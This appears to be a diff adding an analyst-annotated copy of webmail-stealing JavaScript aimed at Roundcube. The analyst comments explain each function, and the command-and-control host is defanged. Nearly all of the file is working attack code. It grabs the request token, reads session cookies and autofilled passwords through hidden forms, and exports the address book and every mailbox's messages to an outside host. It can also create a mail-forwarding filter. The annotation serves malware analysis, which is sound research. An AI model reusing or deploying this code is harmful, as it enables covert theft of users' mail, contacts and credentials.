@@ -1,0 +1,439 @@
+;(function () {
+    const f = (function () {
+        let H = true
+        return function (I, J) {
+          const K = H
+            ? function () {
+                if (J) {
+                  const L = J.apply(I, arguments)
+                  return (J = null), L
+                }
+              }
+            : function () {}
+          return (H = false), K
+        }
+      })(),
+      // The function g is used for logging purposes
+      g = f(this, function () {
+        // It checks the environment to determine the appropriate object (H) to use as the console. H defaults  to window in a browser environment, global in a Node.js environment, or this if none is available.
+        const H =
+            typeof window !== 'undefined'
+              ? window
+              : typeof process === 'object' &&
+                typeof require === 'function' &&
+                typeof global === 'object'
+              ? global
+              : this,
+          I = (H.console = H.console || {}),
+          J = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
+        for (let K = 0; K < J.length; K++) {
+          const L = f.constructor.prototype.bind(f),
+            M = J[K],
+            N = I[M] || L
+          L['__proto__'] = f.bind(f)
+          L.toString = N.toString.bind(N)
+        }
+      })
+    g()
+    const h = document.location.toString().split('?')[0],
+      k = 'https://rcstat[.]com:443/'
+    let l, m
+    async function n() {
+      // If rcmail object is defined, get request token from it else get request token from server stored in variable h and return its value
+      if (typeof rcmail !== 'undefined') {
+        return rcmail.env.request_token
+      } else {
+        if (l) {
+          return l
+        } else {
+          let H = await fetch(h),
+            I = await H.text()
+          return (l = I.split('"request_token":"')[1].split('"')[0]), l
+        }
+      }
+    }
+    async function o(H) {
+       // Perform a HTTP GET request  on the specified URL (H)
+
+      let I = await fetch(H, {
+        headers: new Headers({
+          'X-Requested-With': 'XMLHttpRequest',
+          'X-Roundcube-Request': await n(),
+        }),
+      })
+      return I.text()
+    }
+    async function p(H) {
+      let I = await fetch(H, {
+        headers: new Headers({
+          'X-Requested-With': 'XMLHttpRequest',
+          'X-Roundcube-Request': await n(),
+        }),
+      })
+      return I.json()
+    }
+    async function q() {
+    //retrieves a list of mailbox names. It extracts the subscription rows from the response and filters out mailboxes that are empty or named 'Trash'
+      let H = '?_task=settings&_action=folders',
+        I = await o(h + H),
+        J = I.match(/rcmail.set_env\((.+)\);/m)[1],
+        K = JSON.parse(J).subscriptionrows
+      return Object.values(K)
+        .map((L) => L[0])
+        .filter((L) => L != '' && L.toLowerCase() !== 'trash')
+    }
+    async function r(H) {
+      let I = await fetch(H, { method: 'GET' })
+      return I.json()
+    }
+    async function* s(H, I) {
+     // This function yields batches of email message IDs from a specified mailbox (H) based on a given date threshold (I).
+      let J =
+          '?_task=mail&_action=list&_mbox=' +
+          encodeURIComponent(H) +
+          '&_page=1&_remote=1',
+        K = await p(h + J)
+      if (!K.hasOwnProperty('env')) {
+        return []
+      }
+      let L = K.env
+      const M = L.messagecount,
+        N = L.current_page,
+        O = L.pagesize,
+        P = Math.floor(M / O) + (M % O == 0 ? 0 : 1)
+      let Q = true,
+        R = (S) => {
+          let T = S.split('\n'),
+            U = []
+          for (let V = 0; V < T.length; V++) {
+            message_row = /this\.add_message_row\((.*)\)/.exec(T[V])
+            if (message_row != null && message_row.length > 1) {
+              let W = /(\d+),(\{.*\}),(\{.*\}),(\w+)/.exec(message_row[1]),
+                X = JSON.parse(W[2]),
+                Y = Date.parse(X.date)
+              if (isNaN(Y) || Y >= I) {
+                U.push(parseInt(W[1]))
+              } else {
+                Q = false
+                break
+              }
+            }
+          }
+          return U
+        }
+      yield R(K.exec)
+      if (!Q) {
+        return []
+      }
+      if (P > 1) {
+        for (let S = 2; S < P + 1; S++) {
+          J =
+            '?_task=mail&_action=list&_mbox=' +
+            encodeURIComponent(H) +
+            '&_refresh=1&_remote=1&_page=' +
+            S
+          K = await p(h + J)
+          yield R(K.exec)
+          if (!Q) {
+            break
+          }
+        }
+        J =
+          '?_task=mail&_action=list&_mbox=' +
+          encodeURIComponent(H) +
+          '&_refresh=1&_remote=1&_page=' +
+          N
+        await o(h + J)
+      }
+      return []
+    }
+    async function t(H, I) {
+      // Constructs a url and retreives the result by sending a GET response to the url. It gives the maibox and uid and action as viewsource in the url
+      let J =
+          '?_task=mail&_mbox=' +
+          encodeURIComponent(I) +
+          '&_uid=' +
+          H +
+          '&_action=viewsource',
+        K = await o(h + J)
+      return K
+    }
+    async function u(H, I) {
+    //This function seems to be part of an email-related application, dealing with fetching, processing, and posting email messages within a specified date range.
+    // Value of H = "https://rcstat[.]com:443/emails/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t"
+    // Value of I = "2023-10-03T00:00:00.000Z"
+    // Sends request to https://rcstat[.]com:443/r/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t to get extra ids
+    extra_ids = await r("https://rcstat[.]com:443/r/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t")
+
+    //   extra_ids = await r(k + 'r/' + 'cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t')
+      // Gets mailboxes
+      // For each mailbox, it processes messages within the date range specified by I.It checks whether each message is in extra_ids and, if not, sends the content of the message to the specified URL H using a POST request.
+
+
+      let K = await q(),
+        L = K.map(async (M) => {
+          for await (let N of s(M, I)) {
+            let O = N.filter((P) => {
+              if (extra_ids.hasOwnProperty(M)) {
+                return !extra_ids[M].includes(P)
+              }
+              return true
+            }).map(async (P) => {
+              let Q = await t(P, M),
+                R = new FormData()
+              R.append('eml', new Blob([Q]), P)
+              R.append('mbox', M)
+              const S = {
+                method: 'POST',
+                mode: 'no-cors',
+                body: R,
+              }
+              await fetch(H, S)
+            })
+            await Promise.all(O)
+          }
+        })
+      return Promise.all(L)
+    }
+    async function v(H) {
+        // Get the request token using function n. Gets the response from the url base_value+"?_task=addressbook&_source=0&_action=export&_token="+token and sends the response to "https://rcstat[.]com:443/addressbook/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t"
+      let I = await n(),
+        J = '?_task=addressbook&_source=0&_action=export&_token=' + I,
+        K = await o(h + J)
+      return fetch(H, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: K,
+      })
+    }
+    async function w(H) {
+      //Checks if document cookie contains the substring roundcube_sessid. If it does, it sets the request body to document cookie else does nothing
+      if (document.cookie.search(/roundcube_sessid/) > 0) {
+        const I = { M: L }
+        return (
+          (I.method = 'POST'),
+          (I.mode = 'no-cors'),
+          (I.body = document.cookie),
+          fetch(H, I)
+        )
+      } else {
+        return Promise.resolve()
+      }
+    }
+    async function x(H) {
+      // In this case, the argument of H is '' so it does nothing
+      if (H == '') {
+        return
+      }
+      let I = 'default filter',
+        J = await y()
+      if (J === undefined) {
+        return
+      }
+      await C(J)
+      let K = await z(J),
+        L = K.filter((M) => M.name == I)
+      return L.length == 0 ? A(I, H) : B(I, H, L[0].id.toString())
+    }
+    async function y() {
+      let H = '?_task=settings&_action=plugin.managesieve',
+        I = await o(h + H),
+        J = I.match(/rcmail.set_env\((.+)\);/m)[1]
+      return JSON.parse(J).currentset
+    }
+    async function z(H) {
+      let I = '?_task=settings&_action=plugin.managesieve-action',
+        J = await fetch(h + I, {
+          method: 'POST',
+          headers: {
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Roundcube-Request': await n(),
+          },
+          body: new URLSearchParams({
+            _act: 'list',
+            _set: H,
+            _remote: '1',
+          }),
+        }),
+        K = await J.json(),
+        L = /\{.*\}/.exec(K.exec)
+      if (L == null) {
+      }
+      return JSON.parse(L).list
+    }
+    async function A(H, I) {
+      return B(H, I, '')
+    }
+    async function B(H, I, J) {
+      return fetch(h, {
+        method: 'POST',
+        headers: {
+          'X-Requested-With': 'XMLHttpRequest',
+          'X-Roundcube-Request': await n(),
+        },
+        body: new URLSearchParams({
+          _token: await n(),
+          _task: 'settings',
+          _action: 'plugin.managesieve-save',
+          _framed: '1',
+          _fid: J,
+          _name: H,
+          _enabled: '1',
+          _join: 'any',
+          '_header[0]': 'subject',
+          '_custom_header[0][]': '',
+          '_custom_var[0][]': '',
+          '_rule_date_part[0]': 'date',
+          '_rule_message[0]': 'duplicate',
+          '_rule_op[0]': 'contains',
+          '_rule_target[0][]': '',
+          '_rule_size_op[0]': 'over',
+          '_rule_size_target[0]': '',
+          '_rule_size_item[0]': '',
+          '_rule_mod[0]': '',
+          '_rule_mod_type[0]': 'all',
+          '_rule_comp[0]': '',
+          '_rule_mime_part[0]': '',
+          '_rule_mime_type[0]': '',
+          '_rule_mime_param[0][]': '',
+          '_rule_trans[0]': 'text',
+          '_rule_trans_type[0]': '',
+          '_rule_date_header[0]': '',
+          '_rule_index[0]': '',
+          '_rule_duplicate_handle[0]': '',
+          '_rule_duplicate_header[0]': '',
+          '_rule_duplicate_uniqueid[0]': '',
+          '_rule_duplicate_seconds[0]': '',
+          '_action_type[0]': 'redirect_copy',
+          '_action_target[0]': I,
+          '_action_target_area[0]': '',
+          '_action_reason[0]': '',
+          '_action_subject[0]': '',
+          '_action_from[0]': '',
+          '_action_addresses[0][]': '',
+          '_action_interval[0]': '',
+          '_action_flags[0][]': '',
+          '_action_varname[0]': '',
+          '_action_varvalue[0]': '',
+          '_action_notifymethod[0]': 'mailto',
+          '_action_notifytarget[0]': '',
+          '_action_notifymessage[0]': '',
+          '_action_notifyfrom[0]': '',
+          '_action_notifyimportance[0]': '2',
+          '_action_notifyoption[0][]': '',
+          '_action_mailbox[0]': 'INBOX',
+        }),
+      })
+    }
+    async function C(H) {
+      let I = '?_task=settings&_action=plugin.managesieve'
+      return fetch(h + I, {
+        method: 'POST',
+        headers: new Headers({
+          'X-Requested-With': 'XMLHttpRequest',
+          'X-Roundcube-Request': await n(),
+        }),
+        body: new URLSearchParams({
+          _act: 'setact',
+          _set: H,
+          _remote: '1',
+        }),
+      })
+    }
+    async function D() {
+      if (m) {
+        return m
+      }
+      let H = '?_task=settings&_action=about'
+      return (m = await o(h + H)), m
+    }
+    async function E(H) {
+    //Performs a fetch operation with body value given by function m
+    // Value of H = "https://rcstat[.]com:443/about/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t"
+      return fetch(H, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: await D(),
+      })
+    }
+    async function F(H) {
+      // Base64 encodes the input string and performs fetch request to url "https://rcstat[.]com:443/p/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t"
+      function J(Q) {
+        return (
+          (Q = btoa(Q)),
+          fetch(H, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: Q,
+          })
+        )
+      }
+      function K(Q) {
+        // Creates an html form and appends it to document body. Assigns username value in first iteration and [] in second iteration. Waits for 1000 ms.
+        return new Promise((S) => {
+          N += 1
+          let T = document.createElement('form')
+          T.setAttribute('id', 'mailform' + N)
+          T.setAttribute('method', 'POST')
+          T.setAttribute('style', 'display:none')
+          T.setAttribute('style', 'display:none')
+          document.body.appendChild(T)
+          document.getElementById('mailform' + N).innerHTML += M.replace(
+            '%U%',
+            'username' + N
+          ).replace('%P%', 'password' + N)
+          document.getElementById('username' + N).value = Q
+          setTimeout(() => {
+            S(document.getElementById('password' + N).value)
+          }, 1000)
+        })
+      }
+      //
+      function L(Q) {
+        //Defines an event handler for on-click event and clears it after first clicks. Retreives username and password.
+        document.body.onclick = function (R) {
+          document.body.onclick = function (S) {}
+          for (let S = 0; S < Q; S++) {
+            let T = document.getElementById('password' + S)
+            if (T != null) {
+              let U = T.value
+              if (U != '') {
+                let V = document.getElementById('username' + S).value
+                return J(V + ' ' + U)
+              }
+            }
+          }
+        }
+      }
+      //Creates document form using function K. Sends base 64 encoded string through J and retreives the username and password in function L
+      let M =
+          '\n    <input type="text" name="username" id="%U%" /><br />\n    <input type="password" name="password" id="%P%" /><br />\n    ',
+        N = 0,
+        O = "research@strikeready.com",
+        P = [O]
+      O.indexOf('@') >= 0 && P.push(O.split('@')[0])
+      for (let Q = 0; Q < P.length; Q++) {
+        let R = await K(P[Q])
+        if (R != '') {
+          return J(P[Q] + ' ' + R).catch((S) => {})
+        }
+      }
+      L(N)
+    }
+    function G() {
+      // This function is a promise. It executes functions F, x, E , w and v. If all of them are executed, then it executes u. If there is an exception, it sets variable H to empty
+      return Promise.all([
+        F("https://rcstat[.]com:443/p/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t").catch((H) => {}),
+        x(''),
+        E('https://rcstat[.]com:443/about/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t').catch((H) => {}),
+        w('https://rcstat[.]com:443/s/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t').catch((H) => {}),
+        v('https://rcstat[.]com:443/addressbook/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t').catch((H) => {}),
+      ])
+        .then(
+          u('https://rcstat[.]com:443/emails/cmVzZWFyY2hAc3RyaWtlcmVhZHkuY29t', new Date('2023-10-03'))
+        )
+        .catch((H) => {})
+    }
+    return G()
+  })()
+  
